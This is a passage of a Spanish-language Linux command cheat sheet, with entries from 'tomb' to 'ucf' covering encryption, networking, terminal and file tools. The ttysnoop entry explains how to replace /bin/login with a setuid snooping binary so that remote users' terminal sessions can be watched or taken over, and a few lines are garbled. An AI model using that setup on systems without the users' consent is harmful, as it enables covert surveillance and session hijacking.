# tomb create -s 1024 --ignore-swap cripta (Crear el directorio encriptado .tomb y el de la clave .key, especificando medida. Pedirá contraseña y confirmación. )
# tomb-open cripta.tomb (Abrir el directorio encriptado cuando .tomb y .key estan en el mismo directorio. Lo montará en /media/tumba.tomb)
# tomb -k /root/cripta.tomb.key open cripta.tomb (Montar el directorio encriptado cuando .key está en otro directorio [/root]
# tomb close cripta (Cerrar el directorio. En realidad desmontarlo)


toot
Cliente de la red social de microblogging Mastodon libre y descentralizada similar a Twitter.
$ toot --help (muestra todos los comando que pueden utilizarse)
$ toot bookmark --help (información de un comando concreto)
$ toot login (pulsar intro a las preguntas y cuando abra el navegador autorizamos, copiamos el codigo y lo pegamos en la terminal)
$ toot tui (comenzar uso de la red social)
$ toot auth (mostrar cuentas e instancias conectadas)
$ toot post "Texto que se envia"
$ toot post -m $HOME/Images/gnu.png "Texto adjunto a la imagen"
$ toot search otro-usuario (buscar un usuario)
$ toot timeline (muestra las publicaciones més recientes)
$ toot delete (borrar estado)
$ toot notifications (ver notificaciones del usuario logueado)
$ toot whois @usuario (información del perfil de @usuario)
$ toot logout (cerrar sesión y eliminar claves de acceso almacenadas)


top
información sobre el estado del sistema, procesos, uso del procesador, memoria etc... en ejecucion
$ top | grep Tasks (Visualizar procesos abiertos incluidos los zombies)
$ top -u usuario  (procesos abiertos por el usuario indicado)
$ top -p $(pgrep -d, yaourt) (Monitorizar un proceso)
$ top -p `pgrep pidgin` (Monitorear un proceso)
$ top -b -n 2 -d 2 (En modo batch [b] que termine el comando despues de mostrar 2 procesos top [n] con un intervalo de 2 segundos [d])
Teclas de control
Ctrl + m (los ordenamos por uso de memoria)
Ctrl + c  (Salir)
k  (y colocar el PID correspondiente mataremos el proceso)
Z  (para modificar el color. Con “z” se escoge el color)
n  ( y colocar el número de procesos que queremos visualizar)
A  (abre multiples ventanas “top”)
f   (activa/desactiva columnas a visualizar)
o  (Modifica el orden de las columnas)
G + num (del 1 al 4 cambia el modo de presentación)
W (Graba el tipo de visualización. A partir de la siguiente vez que se lance la aplicación se mostrará con los parámetros grabados)
Columnas:
PID .-		 Identificador
USER.-	 Usuario que ha ejecutado el proceso.
PR.-		 Prioridad
NI.-		 Valor nice del proceso (negativos-> mayor prioridad)
RES.-		 Memoria RAM ocupada por el proceso.
%CPU.-	 Porcentaje ocupado de la CPU
TIME+.-	 Cuanto tiempo lleva el proceso en el sistema.
COMMAND.- Nombre del procesos y sus parametros.
PPID.-		 PID del proceso padre.
UID.-		 ID del usuario que ha ejecutado el proceso.


toplip
Herramienta para encriptar archivos.
$ toplip archivo.txt (encriptar pero solo viendolo por teminal)
$ toplip archivo.txt > archivo.txt.cryp (encriptar y mardarlo a un archivo)
$ toplip -d archivo.txt.cryp > archivo.txt (desencriptar)
$ toplip -alt archivo1.txt archivo2.txt > archivo_global.crip (Encriptar dos archivos en uno pero con dos contraseñas para cada archivo encriptado)
$ toplip -d archivo_global.crip > archivo1.txt (desencriptar si entramos la contraseña del primer archivo encriptado)
$ toplip -c 2 archivo.txt > archivo.txt.crip (encriptar un archivo con dos contraseñas)
$ toplip -c 2 -d archivo.txt.crip > archivo.txt (desencriptar un archivo con dos contraseñas)
$ toplip -m imagen.jpg archivo.txt > imagen_crip.jpg
$ toplip -d imagen_crip.png > archivo.txt


torify
Verificar si la navegación está torificada.
$ torify elinks checkip.dyndns.org


tor-resolve
Resuelve direcciones IP o nombres de host via tor.
$ tor-resolve lapipaplena.net


torsocks
Permite lanzar aplicaciones a través de la red tor para enmascarar la ip. Puede usarse indistintamente los comandos torsocks o usewithtor. Ver proxychains. Precisa tor funcionando.
# torsocks ssh usuario@host
# torsocks w3m ifconfig.me
# usewithtor pidgin


totem
Reproductor de video
$ totem-video-thumbnailer -pg 30 video.mpeg salida (Creación de una imagen formada por thumbnailes de un video)


touch
Crea un fichero vacio
$ touch notas.txt
# touch /forcefsck (crear un fichero vacío para forzar el chequeo del disco)
$ touch -d "18-6-2011 17:09:24" archivo (modificar la fecha de creación)
$ touch -m archivo (Lo mismo a la fecha actual)
$ touch file{1..9} (crear los archivo del file1 al file9
$ touch file{1..9}{a..z} (Crear los archivos del filea1 al filez9)
$ touch a b c d (Crear varios archivos)
$ touch -c archivo (Si “archivo” existe no lo creará)
$ touch -a archivo (modifica el último acceso al archivo. Comprobar con $ stat archivo)


tpp
Presentaciones en terminal.
--title Este_es_el_titulo   (titulo de la presentación)
--author juanito            (Autor)
--date today  %d %b %Y      (fecha actual en formato dia/mes/año)
--bgcolor yellow           (color de fondo)
--fgcolor black            (color texto. Los colores válidos son: white, yellow, red, green, blue, cyan, magenta, black. Por defecto transparencia))
--heading inicio           (nombre de la página, centrado)
--horline                  (dibuja una linea en todo el ancho de pantalla)
--withborder               (Marca un borde en los limites de la pantalla)
--header texto             (Texto arriba del todo de la página)
--footer texto             (Texto abajo del todo de la página)
--color red 		   (Especifica un color de texto a partir de este punto)
--center Se_pondra_en_el_centro   (El texto se centrará en la página)
--right texto       (El texto se alineará a la derecha)
---         (parar la presentación hasta que se clique en la barra de espacio)
--newpage	    (nueva página. Se accede pulsando cursor abajo o espacio)
--##comentario	  	    (comentario. No aparece en la presentación)
--sleep 5           (Para la presentación 5 segundos. Por defecto son 3)
--huge Fin_de_la_presentacion 	(Figlet generará las letras del texto)
--sethugefont big   (Los tipos de letra disponibles son los de figlet: banner, big, block, bubble, digital, ivrit, leas, mini, mnemonic, script, shadow, slant, small, smscript, smshadow, smslant, standard y term)
--exec fbi -vt 01 imagen.png        (Ejecuta el comando)
--beginoutput       (crea el inicio de un marco de texto)
El_texto_que_proceda
--endoutput         (Final del marco de texto)
--beginshelloutput  (Inicio marco de texto. Con "$" saldrá letra a letra)
$ El_texto-que-proceda
--endshelloutput    (Final marco de texto)
--bZoldon            (Inicio de escritura en negrita)
El_texto_que_proceda
--boldoff	    (Final del uso de negrita)
--revon	            (Invierte los colores de letra y fondo)
El_texto_que_proceda
--revoff	    (Termina la inversión)
--ulon              (Inicio texto subrayado-??)
El_texto_que_proceda
--uloff             (Final texto subrayado)
--beginslideleft    (El texto sale de izquierda a derecha)
El_texto_que_proceda
--endslideleft      (Final de salida de izquierda a derecha)
--beginslideright   (El texto sale de derecha a izquierda)
El_texto_que_proceda
--endslideright     (Final de salida de derecha a izquierda)
--beginslidetop     (Inicio de la salida del texto de arriba)
El_texto_que_proceda
--endslidetop       (Final de salida del texto de arriba)
--beginslidebottom  (Inicio de salida del texto por abajo)
El_texto_que_proceda
--endslidebottom    (Final de salida por abajo)
Teclas para desplazarse durante la presentación
espacio (visualizar página siguiente)
b (visualizar página anterior)
q (salir de tpp)
j (saltar a la página que se indique con el teclado numérico)
s (saltar a la página de inicio)
e (ir a la última página)
c (inicio de línea de comandos)


tput
formatación de la terminal [posicionar el cursor en la pantalla, borrar datos de la pantalla, saber la cantidad de líneas y columnas de la pantalla, posicionar correctamente un campo, borrar un campo..]
$ tput cols  (Cantidad de columnas de la terminal)
$ tput lines (Cantidad de lineas)
$ tput civis (Hace invisible el cursor)
$ tput cnorm (Lo vuelve visible)
$ tput sgr0 (vuelve la terminal a los parámetros por defecto)
$ tput smcup (Borra el contenido de la terminal guardandolo)
$ tput rmcup (Restablece el contenido de la terminal borrado con el comando anterior)


tr
Cambia caracteres de un archivo
$ tr JM ?$ < archivo  (cambia las "J" y las "M" por "?" y "$" en todo el archivo)
$ cat archivo | tr ea ?% (Cambia las "e" y "a" por "?" y "%" respectivamente)
$ echo 'la pipa plena' | tr 'a-z' 'A-Z'  (De minúsculas a mayúsculas)
$ echo 'la pipa plena' | tr -d a (Borra las “a”)
$ tr -d [aeiou] archivo  (Borra las vocales de archivo)
$ echo 'la   pipa    plena' | tr -s ' ' (Borra espacios repetidos)
$ echo 'la pipa plena' | tr -c 'pln' '?' (Substituye todos los caracteres  por “?” inclusive los espacios, menos los indicados [pln])
$ ls |tr '\t' '\n' (Substituye la tabulación vertical [\t] por salto de linea [\n])
$ tr -dc A-Za-z0-9_ < /dev/urandom | head -c 8 | xargs   (contraseñas de 8 caracteres aleatorias)
$ echo "El boxeador está OK." | tr O m | tr K a | tr . l (varios tr)
$ tr " " . < archivo (substituir los espacios por puntos)
$ tr -c "[:digit:]" " " < /dev/urandom | dd cbs=$COLUMNS conv=lcase,unblock | GREP_COLOR="1;32" grep --color "[^ ]" (salvapantallas como matrix)


traceroute
Permite seguir la pista de un paquete desde un host a otro.
# traceroute www.tuxapuntes.com


tracepath
Similar a la utilidad traceroute [ver], pero también intenta descubrir la MTU de la ruta. En las redes, la unidad de transmisión máxima [MTU] es una medida que representa el tamaño máximo de paquetes de datos que un dispositivo conectado a una red aceptará. Los paquetes que exceden la MTU [1500 bytes de medida máxima] de una red no pueden atravesarla. Admite IPv4 e IPv6.
$ tracepath -p 80 localhost (del puerto 80 de localhost)
$ tracepath google.es


trafshow
[netliag[. Es un programa interactivo que reúne el tráfico de red de todas las interfaces con capacidad de libpcap para acumularlo en la memoria caché.
# trafshow -R 1 -p (actualizar cada segundo y no poner en modo promiscuo)


tran
Herramienta que permite transliterar una palabra o una frase a otros tipos de escritura. La conversión permite comprender texto o, al menos los nombres, pero no el significado.
$ tran list (listado)
$ echo linux es genial | tran devanagari
$ echo linux es genial | tran greek
$ echo линукс эс гэнял | tran latin (salida anterior a latin)


trans
[translate-shell]. Anteriormente Google Translate CLI. Es un traductor de línea de comandos impulsado por Google Translate (predeterminado), Bing Translator, Yandex.Translate y Apertium.
$ trans -list-all (listado de todos los lenguajes soportados)
$ trans -T (ademas del listado de lenguajes soportados, su código correspondiente)
$ trans -list-all (listado de lenguajes y codigos)
$ trans -S (motores de traducción disponibles)
$ trans -i entrada.txt -o salida.txt (especificando un archivo con el texto de entrada y que muestre la traducción en salida.txt)


transmission-remote-cli
Comando para conectar con un servidor de descargas de transmission y gestionarlo.
$ transmission-remote-cli (conectar con transmission. Mira los ajustes de .config/transmission-remote-cli/settings.cfg)
$ transmission-remote-cli -f ruta/settings.cfg (especificar ruta fichero configuración)
$ transmission-remote-cli --create-config (Crea un archivo de configuración de ejemplo dentro de .config/transmission-remote-cli/settings.cfg)


trap
Captura señales del teclado. Permite ejecutar un comando especificado cuando se produce una señal con un determinado valor.
$ trap -l (Lista todos los valores)
$ trap "rm -f /tmp/$$ ; exit" 0 1 2 3 15 (ejecutará el rm si se produce una señal: 0 [Salida de la shell], 1 [SIGHUP, cuelgue], 2 [SIGINT, interrupción con ^C], 3 [SIGQUIT, quiet] o 15 [SIGTERM, terminate, señal por defecto de kill]
Ejemplo:
$ nano no_muero.sh
	#!/bin/bash
	trap "echo ' Aunque pulses Ctrl+C!'" INT
	while true
	do
	sleep 60;
	echo "No puedes matarme"
	done
El script se repetirá hasta pararlo con Ctrl+z. A continuación mirar el pid
$ jobs
$ kill -9 %pid (Para matarlo definitivamente)


trash-cli
Proporciona una utilidad de papelera en línea de comandos. Recuerda el nombre, la ruta original, la fecha de eliminación y los permisos de cada archivo eliminado. Consta de varias aplicaciones trash-empty, trash-list, trash-put, trash-restore y trash-rm.
$ trash archivo (elimina archivo)
$ trash-put archivo (lo mismo)
$ trash-list (Lista los archivos eliminados)
$ trash-restore (Pregunta el número del archivo a restaurar)
$ trash-rm *.txt (borrar todos los txt de la papelera)
$ trash-empty (Vacia la papelera)


tree
Lista archivos y directorios en forma de arbol.
$ tree -d (Sólo los directorios de la presente carpeta)
$ tree -o archivo (Enviar el resultado a un archivo)


treil
Produce una imagen de mosaicos a partir de una estructura de árbol de un directorio.
$ treil -g 800x600 -o imagen.png /usr/share (Con una geometria determinada [g], que la imagen se guarde como imagen.png [o] y el directorio del cual crear la imagen)


trickle
Limitar la velocidad de subida/bajada
Nota.- "-d" subida y "-u" bajada
$ trickle -d 50 -u 30 wget http://www.genbeta.com (limitación para un solo host)
$ trickled -d 50 -u 30 (Lanzar la limitación como demonio con lo que todas las aplicaciones que se lancen con trickle tendran la limitación especificada)
$ trickle wget http://www.genbeta.com


trimage
Herramienta para optimizar los archivos de imagen para sitios web, utilizando optipng, pngcrush, advpng y jpegoptim, dependiendo del tipo de archivo (actualmente, los archivos PNG y JPG son compatibles). Todos los archivos de imagen se comprimen sin pérdidas en los niveles de compresión más altos disponibles y EXIF y otros metadatos se eliminan.
$ trimage -f image.png (un archivo)
$ trimage -f *.png (varios)
$ trimage -d imagenes (un directorio)


tripwire
Herramienta para la detección de intrusos (IDS). Tripwire es una herramienta de comprobación de la integridad del sistema que permite detectar alteraciones en los archivos.
# tripwire --init (iniciar el servicio)
# tripwire --check (chequear el sistema)
# tripwire --check /usr (chequear un directorio especifico)
# tripwire --update (actualizar la base de datos)
# tripwire --test --email user@correo.com (realizar un test y enviarlo por correo al user)
# twprint --print-report --twrfile /var/lib/tripwire/report/Debian-20191230-190624.twr > report.txt (escribir un reporte de informe)


trocla
Generar contraseñas aleatorias y almacenarlas en varios formatos [normal, MD5, bcrypt] y poder recuperarlas.
$ trocla formats (listado de opciones)
$ trocla create usuario1 plain (creará una contraseña aleatoria y almacenará su texto sin formato en la clave usuario1. La contraseña también se mostrará en la salida)
$ trocla create usuario1 mysql (creará una contraseña aleatoria sha1 y estilo mysql se almacenará y mostrará su hash)
$ trocla create usuario2 plain 'charset: alphanumeric'
$ trocla get usuario1 plain (devuelve la contraseña almacenada para usuario1)
$ trocla delete usuario1 plain (eliminar la contraseña de usuario1 y la muestra)
$ trocla create usuario1 plain 'encode: sha512crypt'


true
No realiza absolutamente nada de los comandos que le siguen.
$ true rm * (no elimina nada)
$ true ls (no lista nada)
$ true nano /etc/fstab (no muestra el fstab)


truecrypt
Aplicación que permite cifrar sistemas de archivos enteros, generar archivos cifrados y tambien generar sistemas ocultos dentro de otros sistemas. Descarga de : http://www.truecrypt.org/downloads
Descomprimir y ejecutar:
	$ tar xf truecrypt-7.1a-linux-console-x64.tar.gz
	# ./truecrypt-7.1a-setup-console-x64
# truecrypt -t -c (por consola [t] y ejecutar por primera vez [c]. Sin el parámetro "t" abre la gui)
	Volume type:
	 1) Normal
	 2) Hidden
	Select [1]: 1
	**[Seleccionar si va a estar oculto o no: 1]**
	Enter volume path: /media/cripta
	**[Donde se montará. No tiene que existir el directorio]**
	Enter volume size (sizeK/size[M]/sizeG): 20M
	**[Tamaño del volumen: a voluntad]**
	Encryption algorithm:
	 1) AES
	 2) Serpent
	 3) Twofish
	 4) AES-Twofish
	 5) AES-Twofish-Serpent
	 6) Serpent-AES
	 7) Serpent-Twofish-AES
	 8) Twofish-Serpent
	Select [1]: 5
	**[Algoritmo de encriptación: a voluntad]**
	Hash algorithm:
	 1) RIPEMD-160
	 2) SHA-512
	 3) Whirlpool
	Select [1]: 2
	**[El hash: a voluntad]**
	Filesystem:
	 1) None
	 2) FAT
	 3) Linux Ext2
	 4) Linux Ext3
	 5) Linux Ext4
	Select [2]: 5
	**[El sistema de archivo]**
	Enter password:
	WARNING: Short passwords are easy to crack using brute force techniques!
	**[CUIDADO: Contraseñas cortas son fáciles de romper usando técnicas de fuerza bruta!]**
	We recommend choosing a password consisting of more than 20 characters. Are you sure you want to use a short password? (y=Yes/n=No) [No]: y
	**[Informa que la contraseña tiene menos de 20 caracteres pero la aceptamos de todas formas]**
	Re-enter password:
	**[La repetimos]**
	Enter keyfile path [none]:
	**[Sin archivo de claves: enter]**
	Please type at least 320 randomly chosen characters and then press Enter:
	Characters remaining: 134
	Characters remaining: 26
	**[Nos hace tipear 320 caracteres en el teclado... todavia faltan 134... todavia faltan 26...]**
	 Done: 100,000%  Speed:   22 MB/s  Left: 0 s
	**[Por fin... y toma sus notas... pasamos de ellas...]**
	The TrueCrypt volume has been successfully created.
	**[Finalmente se ha creado el volumen]**
# truecrypt -t /media/cripta (Ejecutando la aplicación. Intro a todo:)
	Enter mount directory [default]:
	Enter password for /media/cripta:
	Enter keyfile [none]:
	Protect hidden volume (if any)? (y=Yes/n=No) [No]:
# truecript -t -l (Comprobar dispositivo montado)
	1: /media/cripta /dev/mapper/truecrypt1 /media/truecrypt1
# truecrypt -d /media/cripta (Desmontar volumen)


trueprint
Se utiliza para imprimir archivos de texto con formato. Es muy útil para revisar archivos de código fuente o texto con mayor legibilidad. Pueden visualizarse con la aplicación gv
$ trueprint --K --W -n -f -F -t sh file.sh -s file.ps (Sin cabeceras [--K], ajuste de lineas inteligente [--W], sin numeración de lineas [-n], sin índice de funciones [-f], sin indice de archivo [--F], en lenguaje shell [-t sh] y redirigido a un fichero postscript [-s])
$ trueprint -H all-options (Muestra todas las opciones de ayuda)
$ trueprint -ln archivo.txt (imprimir números de linea sin recortar espacio en blanco del archivo.txt)
$ trueprint -k archivo.c (resaltar palabras clave del c´digo fuente de C)
$ trueprint -w 80 archivo.txt (para que la salida se ajuste a un ancho de 80 columnas)
$ trueprint -c archivo.py (resaltar los bloques de comentarios del archivo.py)


truncate
Reducir o extender el tamaño de un archivo al tamaño especificado. Si se reduce no se recuperan las partes reducidas.
$ truncate -s 60 archivo.txt (truncar archivo.txt a 60 bytes)
$ truncate -s -60k archivo.txt (Reducir archivo.txt a 60 k)
$ truncate -s +60k archivo.txt (Aumentar archivo.txt a 60 k)
$ truncate -s 0 archivo.txt (Borrar todo el contenido de archivo.txt)


ts
[moreutils]
Añade una marca de tiempo al principio de cada línea de entrada.
$ ts (Escribir cualquier cosa y al darle al intro mostrará la marca del tiempo y lo escrito)


tset
Inicializa los valores de la terminal. Ver reset.


tshark (wireshark en modo consola)
Capturar paquetes y visualizarlos por pantalla:
# tshark -n -i eth0 -s 1515
# tshark -D (Ver las interfaces de red disponibles)
# tshark -n -i eth0 -s 1515 -w archivo (Capturar información y pasarla a un archivo)
# tshark -n -i eth0 -s 1515 -w -filesize:10000 -b 10 -w archivo (Lo mismo especificando medida máxima del archivo (-filesize:10000) y cuantidad de ficheros a crear (-b 10) en Mb
# tshark -n -i eth0 -s 1515 -a duration:3600 -w archivo (Especificando el tiempo que durará - 1 hora)
# tshark -n -t ad -r fitxer.lpc tcp (mostrar los mensajes del protocolo tcp)
# tshark -ni eth0 'tcp port tuxapuntes.com/drupal/80' -R 'http.request.method == "GET"'  (ver todas las peticiones HTTP GET)
Opciones:
-t   Para que salgan las marcas de tiempo real
-n  Inhabilita la resolución de nombres


tsort
realiza una ordenación topológica. Escribe una lista totalmente ordenada de acuerdo con el orden parcial del fichero especificado.
$ tsort archivo.txt


ttv
Webcam en consola y ascii.


tty
Muestra el número de terminal.
$ tty
1- Para entrar en las consolas virtuales, de la Crtl-Alt-F1 a la Crtl-Alt-F6, de forma automática sin tener que logearnos en cada una:
# nano /etc/init.d/agetty-autologin (Crear el archivo de autologin)
Y en su interior poner la linea:
# agetty_options="--autologin <user> –-noclear" (en user poner el que corresponda)
Reiniciar.


tty-clock
Reloj digital por consola.
$ tty-clock -s -c -C 1 (marcando los segundos [s] en el centro de la consola [c] y en color rojo [1])
$ tty-clock -r -s -C 2 (que rebote por los lados de la terminal y de color verde)
Nota.- Otros colores: 3: amarillo, 4: azul, 5: rosa, 6:turquesa, 7: blanco


ttygif
A partir de una grabación de una sesión tty con ttyrec [ver] crea un gif.
  $ ttygif file
  Creating Animated GIF ... this can take a while
  Created: tty.gif in the current directory!


ttylog
Imprime todo lo que proviene de un dispositivo serie a la salida estándar. Se puede especificar el dispositivo y la velocidad en baudios y se puede establecer un tiempo de espera en lugar de simplemente finalizar el proceso para detenerlo.
$ ttylog -t 60 -d /dev/ttyS0 (lo que proviene del dispositivo especificado durante 60 segundos)


ttyrec
Grabación de una sesión tty.
$ ttyrec archivo  (A partir de cuando vuelva a salir el prompt se grabará todo en “archivo”. Finalizar con “killall ttyrec”)
$ ttyplay -s2 archivo (reproducir lo grabado a doble velocidad. Pulsando las telcas “-” y “+”, baja o sube la velocidad de reproducción)
$ ttyrec -a archivo  (Añadir nueva grabación a continuación de archivo. No sobreescribe archivo)
$ ttytime archivo  (Dirá los segundos que dura la grabación)
Nota.- Para compartir el archivo puede subirse a http://playterm.org/


ttysnoop
Permite monitorizar [o tomar el control] el acceso a las terminales por parte de servicios remotos [ssh, telnet...]
Habilitar la aceptación de contraseñas por parte de ssh:
# nano /etc/ssh/sshd_config
Descomentar y modificar el parámetro:
UseLogin yes
Guardar y reiniciar ssh:
# /etc/init.d/ssh restart
Reemplazar el login original por el ttysnnops.
# cd /bin/
# cp -a login lg
# cp -a /usr/sbin/ttysnoops /bin/login
Si al lanzar el último comando sale algo parecido a:
cp: no se ha podido crear el fichero ordinario «/bin/login»: Text file busy
Es que existe alguna consola tty funcionando, aunque no sea como root o root está activo en alguna pts. Matar las consolas y salir de los procesos.
Cambiar los permisos del nuevo login:
# chmod 4755 /bin/login
Editar:
# nano /etc/snooptab
Y modificar la linea:
	* socket login /bin/login
por:
	* socket login /bin/lg
Cuando por los comandos "who" o "finger" observemos que alguien se ha conectado a nuestra máquina:
# who
marquex  pts/2        2010-09-24 16:59 (tux.local)
marquex  tty7         2010-09-24 16:42 (:0)
marquex  pts/0        2010-09-24 16:50 (:0.0)
Lanzar la aplicación:
# ttysnoop 2
Connected to /dev/pts/2 snoop server...
Ctrl+'\' (ASCII 28) to suspend, Ctrl+'-' (ASCII 31) to terminate.
Snoop password:
Verified OK... Snoop started.
La contraseña a introducir tiene que ser la de root, no vale la de usuario con sudo, por tanto los ubunteros:
# passwd root


tuberias
1.-
comando1 | comando2  (el resultado de comando1 se utiliza para comando2)
$ dmesg                            (montón de datos)
$ dmesg | grep 'error'       (solo los que den "error")
2.-
comando1 & comando2 (los comando se ejecutan simultáneamente, pero  comando1 se ejecuta en segundo plano (background))
$ sudo firestarter & ifconfig
[1] 16572                   (pid de firestarter en baskground)
eth0      Link encap:Ethernet  Hwa....  (ejecución de ifconfig)
Matar el proceso de forma clásica (# kill -9 16572)
3.-
comando & exit  (Lanzado como usuario normal, ejecuta el comando o abre la aplicación y cierra la terminal [gedit & exit])
4.-
gksu comando & exit (Lo mismo pero como root [gksu synaptic & exit] Se cierra la terminal pero se abre una ventana pidiendo la contraseña)
5.-
comando1 && comando2  (si comando1 funciona  se ejecuta comando2)
Probar la diferencia con los ejemplos anterior y posterior substituyendo los caracteres.
6.-
comando1 || comando2  (comando2 se ejecuta solamente si comando1 falla)
$ sudo filestarmer || ifconfig
filestarmer: command not found    (error por tanto ...)
eth0      Link encap:Ethe ....           (... se ejecuta ifconfig)
$ ls || ifconfig                                  (solo ejecutará ls)
7.-
comando1; comando2 (comando2 se ejecuta despues de comando1)
$ ls; ifconfig; filestarmer; who
8.-
Redireccionamiento de errores:
$ cat archivo_inexistente
cat: archivo_inexistente: El fichero o el directorio no existe
El error direccionado a un archivo [error]:
$ cat archivo_inexistente 2> error
$
También pueden usarse dos signos > [2>> error] para añadir el error a continuación sin borrar el contenido del fichero “error”. Para mandar los errores al pozo sin fondo:
$ cat archivo_inexistente 2>/dev/null
O varios direccionamientos:
$ find / -name archivo > encontrado 2> errores &
$ find / -name archivo >& encontrado-errores.txt (Otra forma de redirigir a dos archivos [encontrado y errores.txt])
Indicando que la salida del comando find (las rutas en donde encontró el “archivo ”) se almacene en el archivo “encontrado” y que si existe errores en la ejecución del comando (no tiene permisos para entrar a buscar en algún
directorio) el error se almacene en el archivo “errores”. Adicionalmente enviamos el comando a background para poder hacer uso de la terminal mientras se realiza el proceso.


tune2fs
[tunefs]. Chequeo de la tabla de particiones
# tune2fs -c 80 /dev/sda1 (cada 80 reinicios)
# tune2fs -i 2m /dev/sda1 (cada 2 meses)
# tune2fs -i 2w /dev/hda3 (cada 2 semanas)
# tune2fs -i 2d /dev/sda1 (cada 2 dias)
# tune2fs -l /dev/sdb1 (ver registro completo de la partición)
# tune2fs -l /dev/hda3 | grep ‘Last checked’ (ver fecha del último escaneo)
# tune2fs -l /dev/hda3 | grep -i check (veces que se fuerza el chequeo)
# tune2fs -i 0 /dev/hda3 (desactivar chequeo)
# tune2fs -l /dev/hda3 | grep -i ‘mount count’ (lo mismo que el anterior)
# tune2fs -m 1 /dev/sda1 (modificar el espacio reservado para root al 1%. Por defecto es del 5%. Ver dumpe2fs)
# tune2fs -O ^has_journal /dev/sda1 (Desactivar journaling en una partición)
# tune2fs -O has_journal /dev/sda1 (Activar journaling)
1.-
Convertir sistema de archivos de ext3 a ext4. Desde un livecd o una partición no montada :
# tune2fs -O extents,uninit_bg,dir_index /dev/sdax (convertir)
# fsck -pf /dev/sdax  (Para dar consistencia al nuevo sistema)
# mount -t ext4 /dev/sdax /media/punto_de_montaje (montar la unidad)


tuned
Demonio que ajusta dinámicamente la configuración del sistema. Lo hace monitoreando periódicamente el uso de varios componentes del sistema y en base a esa información, los componentes se colocarán en modos de ahorro de energía más bajos o más altos para adaptarse a su uso.
# systemctl status tuned.service (comprobar si está activo)
# tuned (lanzarlo si no está activo)
# tuned-adm list (listado de componentes que pueden optimizarse manualmente)


tuptime
Mostrar el tiempo que esta encendido el sistema.
$ tuptime -l -e (desde que se encendió)
$ tuptime -n (muestra varios parámetros)
$ tuptime -k (tiempo de actividad del kermel)


tv3
Descarga de videos de tv3.cat.
$ wget http://www.gnulinux.cat/dev/tv3.tar.gz
$ tar -xvzf tv3.tar.gz
$ cd tv3
$ bash install
Una vez tengamos la URL del video [por ejemplo: http://www.tv3.cat/videos/4226490/Especial-diada-de-Sant-Felix-a-Vilafranca]
Arrancar la aplicación con el número que muestra:
$ tv3 4226490


TVenLinux.sh
[mplayer, zenity, rtmpdump y curl]. Script para poder ver prácticamente todos los canales de la TDT a través de Internet. Descarga: http://www.tvenlinux.com/TVenLinux.sh. Despues de otorgar permisos [chmod +x TVenLinux.sh) ejecutar con ./TVenLinux.sh.
Atajos
	q (Salir para cambiar de programa o finalizar)
	cursor izquierdo (Si el video y el audio están descompasados, podemos volver 10 segundos atrás y suele solucionar el problema)
	cursor derecho (Avanza 10 segundos)
	m (Silencia)
	p (Pausa / inicia la reproducción. En casos de desconexiones frecuentes, pausar la reproducción permite aumentar la caché)
	f (Pantalla completa)
	Mays + t (Siempre encima)


twidge
Twittear desde la linea de consola.
twidge setup (Configuración inicial)
twidge lsrecent (Leer los últimos mensajes)
twidge update "Texto" (Escribir nuevo mensaje)
twidge lsfollowers (ver listado de seguidores)
twidge following ((ver listado de los que seguimos)
twidge follow "usuario" (seguir al usuario especificado)
twidge unfollow "usuario" (Dejar de seguir a un usuario)
twidge lscommands (Listado de acciones)


twistd
Crear un servidor en el directorio especificado
$ twistd -n web --path .   (Servidor web en el actual)
$ twistd -n web --path /home/usuario/Desktop (en el escritorio)
Para acceder a él desde la red local en el navegador http://IP_local:8080
$ twistd ftp -p 2131 -r /home/usuario/Desktop --userAnonymous=juanito (crear un servidor ftp en el escritorio con el usuario juanito sin contraseña y el puerto 2131)


twitter
Red social.
Atajos de teclado:
	j y k (navegar por los tuits)
	. (desplegar nuevos tuits publicados)
	f (marcar tuit como favorito)
	t (retuitar un tuit favorito)
	r (abrir panel de respuesta a un tuit)
	m (permite escribir nuevo mensaje directo)
	gh (ir a la página principal)
	gc (ir a la página de menciones)
	gp (ir a la página de nuestro perfil)
	gf (ir a la página de tuits marcados como favorito)
	gm (ir a la página de mensajes directos)
	gl (ir a la página de listas)
	gu (buscar perfil de un usuario)


txt2html
Convertir texto a html.
$ txt2html archivo.txt --outfile archivo.html


txt2man
Convierte textos simples en páginas de manual. La sintaxis del texto debe parecerse a la salida proporcionada por el programa man. Incluye las aplicaciones bookman y src2man
$ txt2man -p texto.txt > texto.1
1.-
Ejemplo de un pdf con varias entradas man relacionadas
$ cd /usr/share/man/man1
$ bookman -p -t "Referencias gtk" gtk4* > ~/gtk.pdf


txt2tags
Convertir archivos de texto a distintos formatos.
$ txt2tags -t html fichero.txt   (convierte .txt en .html)


type
Buscar la ubicación del ejecutable e informar si el comando es un alias, un comando interno o externo.
$ type cd (informa que es interno)
$ type mplayer
$ type -a algo (Conocer todas las definiciones de “algo”, teniendo en cuenta que si “algo” es una alias, una función y un script prevalece este orden)
$ type -t cp (Conocer el tipo de un símbolo)


typeset
Define variables y les da atributos. Es necesario para operar con números y hacer cuentas con ellos. Ver "declare"
Un ejemplo de uso en un script:
	#! /bin/bash
	typeset -i suma
	suma=7+5
	echo $suma


tzdiff
Mostrar zona horaria local.
$ tzdiff -n 1 -N -H Europe/Madrid (mostrar hora local)


tzconfig
configurar nuevamente la zona horaria


tzselect
Pregunta al usuario información sobre la localización actual y muestra la descripción de la zona horaria correspondiente.
$ tzselect


tzwatch
Muestra las zonas horarias especificadas por el usuario y las guarda en el archivo ~/.tzlist.
$ tzwatch -c (Lanzar tantas veces como de zonas horarias se quiere disponer de información y seguir las instrucciones: Add Zone, Americas, 26 [Guatemala], mostrará la información y preguntará si es correcta, 1 [yes] y Done [salir])
$ tzwatch (Mostrará hora local de cada una de las zonas elegidas)
	[~]$ tzwatch
	Mon Oct  7 02:39:39 CST 2013   Australia/Adelaide
	Sun Oct  6 18:09:39 CEST 2013   Europe/Madrid
	Sun Oct  6 10:09:39 CST 2013   America/Guatemala


ubuntu-packaging-guide-html
Conjunto de artículos en español fáciles y sencillos, que ayudan a entender el empaquetado y desarrollo de Ubuntu.
$ firefox file:///usr/share/doc/ubuntu-packaging-guide-html-es/index.html


ubuntu-support-status
Muestra el estado del soporte oficial de los paquetes instalados. Útil para determinar cuando será conveniente actualizar el servidor.
$ ubuntu-support-status (Muestra un resumen del estado de los paquetes instalados)
$ ubuntu-support-status --show-unsupported (Muestra una lista detallada de los paquetes que ya no estan soportados)
$ ubuntu-support-status --show-supported (Muestra una lista detallada de los paquetes soportados así como la fecha hasta la que lo estan)
$ ubuntu-support-status --show-all (Muestra una lista detallada de todos los paquetes, tanto los soportados como los que no)


ucf
